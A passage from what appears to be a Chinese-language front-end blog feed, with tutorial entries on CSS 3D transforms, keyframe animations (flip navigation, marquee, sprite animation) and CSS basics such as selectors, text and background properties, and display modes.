alt="1681723547079.png"></p></li><li><p>X 轴：rotateX()<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/1681723568598.png" alt="1681723568598.png"></p></li><li><p>Y 轴：rotateY()<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/1681723587974.png" alt="1681723587974.png"></p></li></ul><p><strong>旋转：左手法则：</strong></p><p>作用：根据旋转方向确定取值正负<br>使用：左手握住旋转轴, 拇指指向正值方向, 其他四个手指弯曲方向为旋转正值方向</p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/1681723629410.png" alt="1681723629410.png"></p><p><strong>rotate3d-了解：</strong></p><ul><li>rotate3d(x, y, z, 角度度数) ：用来设置自定义旋转轴的位置及旋转的角度</li><li>x，y，z 取值为0-1之间的数字</li></ul><p><strong>案例-翻转导航栏：</strong></p><p>CSS部分：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.nav</span> <span class="selector-tag">ul</span> &#123;</span><br><span class="line"><span class="attribute">display</span>: flex;</span><br><span class="line"><span class="attribute">list-style</span>: none;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.nav</span> <span class="selector-tag">li</span> &#123;</span><br><span class="line"><span class="attribute">position</span>: relative;<span class="comment">/*相对定位*/</span></span><br><span class="line"><span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">40px</span>;</span><br><span class="line"><span class="attribute">line-height</span>: <span class="number">40px</span>;</span><br><span class="line"><span class="attribute">transition</span>: all <span class="number">0.5s</span>;<span class="comment">/*添加过渡*/</span></span><br><span class="line"><span class="attribute">transform-style</span>: preserve-<span class="number">3</span>d;<span class="comment">/*设置为3D转换*/</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.nav</span> <span class="selector-tag">li</span> <span class="selector-tag">a</span> &#123;</span><br><span class="line"><span class="attribute">position</span>: absolute;<span class="comment">/*绝对定位*/</span></span><br><span class="line"><span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line"><span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line"><span class="attribute">display</span>: block;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line"><span class="attribute">text-align</span>: center;</span><br><span class="line"><span class="attribute">text-decoration</span>: none;<span class="comment">/*去除字体划线*/</span></span><br><span class="line"><span class="attribute">color</span>: <span class="number">#fff</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 立方体每个面都有独立的坐标轴，互不影响，各自移动避免交叉 */</span></span><br><span class="line"><span class="selector-class">.nav</span> <span class="selector-tag">li</span> <span class="selector-tag">a</span><span class="selector-pseudo">:first</span>-child &#123;</span><br><span class="line"><span class="attribute">background-color</span>: green;</span><br><span class="line"><span class="attribute">transform</span>: <span class="built_in">translateZ</span>(<span class="number">20px</span>);  <span class="comment">/*前页向前移*/</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.nav</span> <span class="selector-tag">li</span> <span class="selector-tag">a</span><span class="selector-pseudo">:last-child</span> &#123;</span><br><span class="line"><span class="attribute">background-color</span>: orange;</span><br><span class="line"><span class="attribute">transform</span>: <span class="built_in">rotateX</span>(<span class="number">90deg</span>) <span class="built_in">translateZ</span>(<span class="number">20px</span>);<span class="comment">/*后页翻转并向上移动*/</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.nav</span> <span class="selector-tag">li</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line"><span class="attribute">transform</span>: <span class="built_in">rotateX</span>(-<span class="number">90deg</span>);<span class="comment">/*鼠标触动后页翻转*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>HTML部分：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;nav&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>首页<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>index<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>分类<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>category<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/1681723827660.png" alt="1681723827660.png"></p><h2 id="缩放-1"><a href="#缩放-1" class="headerlink" title="缩放"></a>缩放</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">transform</span>: <span class="built_in">scale3d</span>(x, y, z);</span><br><span class="line"><span class="attribute">transform</span>: <span class="built_in">scaleX</span>();</span><br><span class="line"><span class="attribute">transform</span>: <span class="built_in">scaleY</span>();</span><br><span class="line"><span class="attribute">transform</span>: <span class="built_in">scaleZ</span>();</span><br></pre></td></tr></table></figure><h1 id="动画"><a href="#动画" class="headerlink" title="动画"></a>动画</h1><p><code>animation</code></p><ul><li>过渡：实现两个状态间的变化过程</li><li>动画：实现多个状态间的变化过程，动画过程可控（重复播放、最终画面、是否暂停）</li></ul><h2 id="动画实现步骤"><a href="#动画实现步骤" class="headerlink" title="动画实现步骤"></a>动画实现步骤</h2><ol><li>定义动画</li></ol><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 方式一：只有两个状态 */</span></span><br><span class="line"><span class="keyword">@keyframes</span> 动画名称 &#123;</span><br><span class="line">  <span class="selector-tag">from</span> &#123;&#125;</span><br><span class="line">  <span class="selector-tag">to</span> &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 方式二：可以设置多个状态 */</span></span><br><span class="line"><span class="keyword">@keyframes</span> 动画名称 &#123;</span><br><span class="line">  <span class="number">0%</span> &#123;&#125;</span><br><span class="line">  <span class="number">10%</span> &#123;&#125;</span><br><span class="line">  ......</span><br><span class="line">  <span class="number">100%</span> &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>使用动画</li></ol><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">animation</span>: 动画名称 动画花费时长;</span><br></pre></td></tr></table></figure><h2 id="复合属性"><a href="#复合属性" class="headerlink" title="复合属性"></a>复合属性</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">animation</span>: 动画名称 动画时长 速度曲线 延迟时间 重复次数 动画方向 执行完毕时的状态;</span><br></pre></td></tr></table></figure><p>提示：</p><ul><li><strong>动画名称</strong>和<strong>动画时长</strong>必须赋值</li><li>取值不分先后顺序</li><li>如果有两个时间值，第一个时间表示动画时长，第二个时间表示延迟时间</li></ul><h2 id="属性拆分写法"><a href="#属性拆分写法" class="headerlink" title="属性拆分写法"></a>属性拆分写法</h2><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/1681724035890.png" alt="1681724035890.png"></p><h2 id="案例-跑马灯"><a href="#案例-跑马灯" class="headerlink" title="案例-跑马灯"></a>案例-跑马灯</h2><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240124213901.png" alt="image.png"></p><p>CSS部分：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box</span> &#123;<span class="comment">/*跑马灯外框*/</span></span><br><span class="line"><span class="attribute">width</span>: <span class="number">480px</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">120px</span>;</span><br><span class="line"><span class="attribute">border</span>: <span class="number">3px</span> solid <span class="number">#000</span>;</span><br><span class="line"><span class="attribute">margin</span>: <span class="number">50px</span> auto;</span><br><span class="line"><span class="attribute">overflow</span>: hidden;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.box</span> <span class="selector-tag">img</span> &#123;<span class="comment">/*图片样式，宽度设定为刚好放入*/</span></span><br><span class="line"><span class="attribute">width</span>: <span class="number">160px</span>;</span><br><span class="line"><span class="attribute">display</span>: block;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.box</span> <span class="selector-tag">ul</span> &#123;</span><br><span class="line"><span class="attribute">display</span>: flex; <span class="comment">/*将列表设置为弹性盒子*/</span></span><br><span class="line"><span class="attribute">animation</span>: imgMove <span class="number">8s</span> infinite linear; <span class="comment">/*设置动画，infinite为循环播放，linear为匀速*/</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*定义动画*/</span></span><br><span class="line"><span class="keyword">@keyframes</span> imgMove &#123;</span><br><span class="line"><span class="number">0%</span> &#123;</span><br><span class="line"><span class="attribute">transform</span>: <span class="built_in">translate</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">100%</span> &#123;</span><br><span class="line"><span class="attribute">transform</span>: <span class="built_in">translate</span>(-<span class="number">800px</span>);<span class="comment">/*设置为整个图片宽度之和*/</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.box</span><span class="selector-pseudo">:hover</span> <span class="selector-tag">ul</span> &#123;</span><br><span class="line"><span class="attribute">animation-play-state</span>: paused;<span class="comment">/*设置鼠标悬停暂停*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>HTML部分：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;car1.png&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;car2.png&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;car3.png&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;car4.png&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;car5.png&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--设置结尾三张重复前三张的图，用于循环时衔接--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;car1.png&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;car2.png&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;car3.png&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="精灵动画"><a href="#精灵动画" class="headerlink" title="精灵动画"></a>精灵动画</h2><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/1681724175321.png" alt="1681724175321.png"></p><p>核心原理：</p><ol><li><code>steps()</code>逐帧动画</li><li>CSS精灵图</li></ol><ul><li>制作步骤：<ol><li>准备显示区域</li></ol><ul><li>盒子尺寸与一张精灵<strong>小图尺寸</strong>相同</li></ul><ol start="2"><li>定义动画</li></ol><ul><li>移动背景图（移动距离 &#x3D; 精灵图宽度）</li></ul><ol start="3"><li>使用动画</li></ol><ul><li><code>steps(N)</code>，N与精灵小图个数相同</li></ul></li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">140px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">140px</span>;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#000</span>;</span><br><span class="line">  <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">./images/bg.png</span>);</span><br><span class="line">  <span class="attribute">animation</span>: run <span class="number">1s</span> <span class="built_in">steps</span>(<span class="number">12</span>) infinite;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@keyframes</span> run &#123;</span><br><span class="line">  <span class="selector-tag">from</span> &#123;</span><br><span class="line">    <span class="attribute">background-position</span>: <span class="number">0</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="selector-tag">to</span> &#123;</span><br><span class="line">    <span class="attribute">background-position</span>: -<span class="number">1680px</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="多组动画"><a href="#多组动画" class="headerlink" title="多组动画"></a>多组动画</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">animation</span>: </span><br><span class="line">  动画一,</span><br><span class="line">  动画二,</span><br><span class="line">  ... ...</span><br><span class="line">;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端开发 </category>
          
          <category> 前端基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> css </tag>
            
            <tag> html </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSS用法</title>
      <link href="/2024/01/19/CSS%E7%94%A8%E6%B3%95/"/>
      <url>/2024/01/19/CSS%E7%94%A8%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="CSS引入方式"><a href="#CSS引入方式" class="headerlink" title="CSS引入方式"></a>CSS引入方式</h1><ul><li>内部样式表：将CSS代码写在style标签当中</li><li>外部样式表：单独出CSS文件，通过link标签引入</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;./my.css&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>行内样式：CSS写在标签的style属性值当中</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;color: red; font-size: 20px;&quot;</span>&gt;</span>这是行内样式<span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="CSS选择器"><a href="#CSS选择器" class="headerlink" title="CSS选择器"></a>CSS选择器</h1><h2 id="基础选择器"><a href="#基础选择器" class="headerlink" title="基础选择器"></a>基础选择器</h2><ul><li>标签选择器：使用标签名作为选择器，同名标签设置相同的样式</li><li>类选择器：定义类名，标签添加<code>.类名</code>，差异化设置标签显示效果</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">.banner&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;banner&quot;</span>&gt;</span>类选择器<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>id选择器：与类类似，定义<code>#id名</code>，一般配合JavaScript使用，同一个id选择器在一个页面只能使用一次</li><li>通配符选择器：所有标签设置相同样式，<code>*</code>不需要调用</li></ul><h2 id="复合选择器"><a href="#复合选择器" class="headerlink" title="复合选择器"></a>复合选择器</h2><p>有多个基础选择器组合</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*后代选择器*/</span></span><br><span class="line"><span class="selector-class">.banner</span> <span class="selector-tag">p</span>&#123;  </span><br><span class="line"><span class="attribute">font-size</span>: <span class="number">20px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*子代选择器，只选中最近的子级*/</span></span><br><span class="line"><span class="selector-class">.banner</span> &gt; <span class="selector-tag">span</span>&#123;  </span><br><span class="line"><span class="attribute">font-size</span>: <span class="number">20px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*并集选择器，多组标签设置相同样式*/</span></span><br><span class="line"><span class="selector-tag">div</span>, <span class="selector-tag">p</span>, <span class="selector-tag">span</span>&#123;  </span><br><span class="line"><span class="attribute">font-size</span>: <span class="number">20px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*伪类选择器，设置元素在某个状态的样式，link为访问前，visited为访问后，hover为鼠标悬停，active为点击时*/</span></span><br><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:hover</span>&#123; </span><br><span class="line"><span class="attribute">color</span>: red;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>优先级：</strong></p><ol><li>通配符选择器 &lt; 标签选择器 &lt; 类选择器 &lt; id选择器 &lt; 行内样式 &lt; !important</li><li>如果是复合选择器，从左向右依次比较选个数，同一级个数多的优先级高，如果个数相同，则向后比较</li></ol><p><strong>结构伪类选择器：</strong> 根据元素的结构关系查找元素</p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240119155411.png" alt="image.png"></p><table><thead><tr><th>选择器</th><th>说明</th></tr></thead><tbody><tr><td>E:first-child</td><td>查找第一个E元素</td></tr><tr><td>E:last-child</td><td>查找最后一个E元素</td></tr><tr><td>E:nth-child(N)</td><td>查找第N个E元素（第一个元素N值为1）</td></tr></tbody></table><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">li</span><span class="selector-pseudo">:first</span>-child &#123;</span><br><span class="line"><span class="attribute">background-color</span>: green;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><table><thead><tr><th>功能</th><th>公式</th></tr></thead><tbody><tr><td>偶数</td><td>2n</td></tr><tr><td>奇数</td><td>2n-1；2n+1</td></tr><tr><td>5的倍数</td><td>5n</td></tr><tr><td>第5个以后</td><td>n+5</td></tr><tr><td>第5个以前</td><td>-n+5</td></tr></tbody></table><p><strong>伪元素选择器：</strong> 创建虚拟元素（伪元素），用来摆放装饰性的内容。</p><table><thead><tr><th>选择器</th><th>说明</th></tr></thead><tbody><tr><td>E::before</td><td>在E元素里面最前面添加一个伪元素</td></tr><tr><td>E::after</td><td>在E元素里面最后面添加一个伪元素</td></tr></tbody></table><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">div</span><span class="selector-pseudo">::before</span> &#123;</span><br><span class="line"><span class="attribute">content</span>: <span class="string">&quot;before 伪元素&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>说明：必须设置<code>content: &quot;&quot;</code>属性，为伪元素内容，没有则留空。默认是行内显示模式，权重和标签选择器相同</p><h1 id="文字属性"><a href="#文字属性" class="headerlink" title="文字属性"></a>文字属性</h1><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">p</span>&#123;</span><br><span class="line"><span class="attribute">font-size</span>: <span class="number">30px</span>;  <span class="comment">/*字体大小，谷歌浏览器默认字体大小16px*/</span></span><br><span class="line"><span class="attribute">font-weight</span>: <span class="number">400</span>;  <span class="comment">/*字体粗细，正常：normal400，加粗：bold700*/</span></span><br><span class="line"><span class="attribute">font-style</span>: normal; <span class="comment">/*字体样式，italic为倾斜*/</span></span><br><span class="line"><span class="attribute">line-height</span>: <span class="number">30px</span>; <span class="comment">/*行高，如果直接用数组表示当前font-size的倍数*/</span></span><br><span class="line"><span class="comment">/*字体族，从左到右依次查找字体，最后一个为字体族名*/</span></span><br><span class="line"><span class="attribute">font-family</span>: Microsoft YaHei, Heiti SC, tahoma, arial, Hiragino Sans GB, <span class="string">&quot;\5B8B\4F53&quot;</span>, sans-serif;</span><br><span class="line"><span class="comment">/*font复合属性 是否倾斜 是否加粗 字号/行高 字体（必须按顺序）*/</span></span><br><span class="line"><span class="attribute">font</span>: italic <span class="number">700</span> <span class="number">30px</span>/<span class="number">2</span> 楷体;</span><br><span class="line"><span class="attribute">text-indent</span>: <span class="number">2em</span>; <span class="comment">/*文本缩进，1em=当前标签字号大小，也可以用px*/</span></span><br><span class="line"><span class="attribute">text-align</span>: center; <span class="comment">/*文本对齐方式，left左对齐（默认），center居中，right右对齐*/</span></span><br><span class="line"><span class="attribute">text-decoration</span>: none; <span class="comment">/*文本修饰线，none无（默认），underline下划线，line-throught删除线，overline上划线*/</span></span><br><span class="line"><span class="attribute">color</span>: <span class="number">#ffffff</span>; <span class="comment">/*文字颜色，可以使用颜色关键字，rgb表示法，rgba表示法，十六进制表示法*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="背景属性"><a href="#背景属性" class="headerlink" title="背景属性"></a>背景属性</h1><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line"><span class="attribute">background-color</span>: <span class="number">#f3f3f4</span>; <span class="comment">/*背景颜色*/</span></span><br><span class="line"><span class="attribute">background-image</span>: <span class="built_in">url</span>(); <span class="comment">/*背景图片*/</span></span><br><span class="line"><span class="attribute">background-repeat</span>: no-repeat; <span class="comment">/*平铺方式，no-repear为不平铺，repeat为平铺（默认），repeat-x为水平平铺，repeat-y为垂直平铺*/</span></span><br><span class="line"><span class="comment">/*背景图位置，关键词：left、right、center、top、bottom，坐标+px：水平正数向右，垂直正数向下*/</span></span><br><span class="line"><span class="attribute">background-position</span>: <span class="number">50px</span>,-<span class="number">100px</span>;</span><br><span class="line"><span class="attribute">background-size</span>: contain; <span class="comment">/*背景图缩放，关键字：cover等比例铺满，contain等比例装入；也可以百分比和px*/</span></span><br><span class="line"><span class="attribute">background-attachment</span>: fixed; <span class="comment">/*背景图固定，不会随着元素内容滚动*/</span></span><br><span class="line"><span class="comment">/*背景复合属性， 背景色 背景图 平铺方式 位置/缩放 是否固定（空格隔开属性值，不区分顺序）*/</span></span><br><span class="line"><span class="attribute">background</span>: pink <span class="built_in">url</span>(<span class="string">./images/1.png</span>) no-repeat right center/cover;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="显示模式"><a href="#显示模式" class="headerlink" title="显示模式"></a>显示模式</h1><p><strong>块级元素：</strong></p><ul><li>独占一行</li><li>宽度默认是父级的100%</li><li>添加宽高属性生效</li></ul><p><strong>行内元素：</strong></p><ul><li>一行可以显示多个</li><li>设置宽高属性不生效</li><li>宽高由内容撑开</li></ul><p><strong>行内块元素：</strong></p><ul><li>一行可以显示多个</li><li>设置宽高属性生效</li><li>宽高也可以由内容撑开</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*转换显示模式， block：块级，inline-block：行内块，inline：行内*/</span></span><br><span class="line"><span class="selector-tag">p</span> &#123;</span><br><span class="line"><span class="attribute">display</span>: inline-block;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="盒子模型"><a href="#盒子模型" class="headerlink" title="盒子模型"></a>盒子模型</h1><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 